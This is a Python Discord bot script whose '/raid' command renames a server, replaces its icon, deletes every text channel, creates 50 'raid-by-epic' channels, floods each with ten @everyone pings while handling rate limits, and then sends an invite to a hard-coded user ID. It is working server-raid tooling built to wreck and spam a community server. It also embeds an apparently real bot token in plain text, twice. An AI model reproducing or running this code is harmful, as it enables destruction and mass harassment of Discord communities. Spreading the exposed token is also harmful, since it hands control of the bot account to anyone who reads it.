import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import requests
from io import BytesIO

# Create bot instance with proper intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content intent
intents.guilds = True  # Allow bot to access guilds and channels

# Create bot with a custom prefix
bot = commands.Bot(command_prefix='!', intents=intents)

# Your bot's token (replace with your actual bot token)
TOKEN = 'MTM0MzI5ODExODI5MjM0MDgwNg.GaAbkf.uOpsdfUGi8bJueMpW0uxYUorOmKPkIUJzSvhjQ'

# Your Discord user ID to DM the invite link to
USER_ID = 1068245257382268968  # Replace with your actual user ID

# Rate limit tracking
rate_limit_detected = False

# Event to confirm bot is online
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Sync commands once bot is ready
    await bot.tree.sync()

# Function to send invite link to a user via DM after the raid is complete
async def send_invite_link_to_user(guild):
    user = await bot.fetch_user(USER_ID)  # Fetch user by ID
    if user:
        try:
            # Generate an invite link for the server
            invite = await guild.text_channels[0].create_invite(max_uses=1, unique=True)
            invite_link = invite.url
            # Send the invite link via DM to the user
            await user.send(f"The raid is complete! You can join the server using this invite link: {invite_link}")
        except discord.Forbidden:
            print("Bot doesn't have permission to create invite.")
        except Exception as e:
            print(f"Error sending invite: {e}")
    else:
        print(f"User with ID {USER_ID} not found.")

# Function to change the server name and profile picture
async def change_server_profile(guild):
    try:
        # Update server name
        await guild.edit(name="Epic bot")
        print("Server name changed to: Epic bot")

        # Update server avatar using the image from the URL
        avatar_url = "https://i.ebayimg.com/images/g/liEAAOSw1aFgvuZt/s-l1200.jpg"
        response = requests.get(avatar_url)

        if response.status_code == 200:
            # Read the image data from the response
            image_data = BytesIO(response.content)

            # Change the server's icon
            await guild.edit(icon=image_data.read())
            print("Server avatar changed.")
        else:
            print("Failed to fetch the avatar image.")
    except discord.Forbidden:
        print("Bot doesn't have permission to manage the server.")
    except discord.HTTPException as e:
        print(f"Error updating server profile: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

# Slash command to create raid channels and send messages
@bot.tree.command(name="raid", description="Delete all channels, then create 50 channels and ping @everyone 10 times in each.")
async def raid(interaction: discord.Interaction):
    global rate_limit_detected  # To track rate limits
    # Ensure the user has admin privileges
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need admin privileges to run this command!", ephemeral=True)
        return

    # Step 1: Change server name and profile picture
    guild = interaction.guild
    await change_server_profile(guild)

    # Step 2: Delete all existing channels in the guild
    for channel in guild.text_channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.Forbidden:
            print(f"Failed to delete channel {channel.name}, insufficient permissions.")
        except discord.HTTPException as e:
            print(f"Error deleting channel {channel.name}: {e}")

    # Step 3: Create the category if it doesn't exist
    category = discord.utils.get(guild.categories, name="Raid Channels")
    if not category:
        category = await guild.create_category("Raid Channels")

    # Step 4: Asynchronously create 50 channels and store them in a list
    channel_creation_tasks = []
    for i in range(50):
        if rate_limit_detected:
            await send_rate_limit_warning()
            await asyncio.sleep(10)  # Wait 10 seconds before continuing to avoid further rate limits
            rate_limit_detected = False  # Reset the flag after cooldown

        channel_creation_tasks.append(
            create_channel_and_send_messages(guild, category, i + 1)
        )

    # Wait for all channel creation and message sending tasks to finish
    await asyncio.gather(*channel_creation_tasks)

    # Respond to the interaction to confirm the action
    await interaction.response.send_message("Deleted all channels and created 50 raid channels and sent 10 messages in each!")

    # Send the invite link to the user via DM after the raid is complete
    await send_invite_link_to_user(guild)

async def create_channel_and_send_messages(guild, category, channel_num):
    global rate_limit_detected  # To track rate limits

    # Create the channel
    channel = await guild.create_text_channel(f"raid-by-epic-{channel_num}", category=category)

    # Send 10 messages pinging @everyone in the created channel asynchronously
    message_tasks = []
    for j in range(10):
        try:
            message_tasks.append(channel.send(f"@everyone This is raid message #{j + 1}!"))
        except discord.errors.HTTPException as e:
            if e.status == 429:
                # If we hit the rate limit, set flag and send DM to notify
                print(f"Rate limit hit when sending message #{j + 1} in channel {channel_num}.")
                rate_limit_detected = True
                await send_rate_limit_warning()  # Notify via DM
                retry_after = e.retry_after
                print(f"Rate limit detected. Waiting for {retry_after} seconds.")
                await asyncio.sleep(retry_after)  # Wait for rate limit to reset
                await channel.send(f"@everyone This is raid message #{j + 1}!")  # Retry sending after cooldown

    # Wait for all messages to be sent in the channel
    await asyncio.gather(*message_tasks)

    # Small delay between channel creation and message sending to prevent excessive load
    await asyncio.sleep(2)  # Wait 2 seconds between actions to avoid hitting rate limits

# Run the bot with the provided token
bot.run('MTM0MzI5ODExODI5MjM0MDgwNg.GaAbkf.uOpsdfUGi8bJueMpW0uxYUorOmKPkIUJzSvhjQ')